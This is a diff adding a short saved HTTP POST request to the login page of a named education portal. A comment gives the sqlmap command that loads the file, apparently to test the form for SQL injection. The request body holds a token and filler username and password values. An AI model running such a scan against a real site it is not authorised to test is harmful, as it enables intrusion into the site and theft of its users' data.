@@ -1,0 +1,3 @@
+http://portal.cloudcampus24.com:80/UserAuth/Login?ReturnUrl=%2F (POST)  # .\sqlmap.py -r .\postReqs\cloudcampus
+
+__RequestVerificationToken=KuXMWIh0WzYZ4iMLABm2ZmRiV0XyJ2pfF-FXbU8sDWRFgzxVHF905PSYI7gkPs1C6abS-52PByRD2WqUvLcQF_leTobRdGnKgyR2HBhoeag1&UserName=fggfffffg&Password=dfgdfgdfgdfg
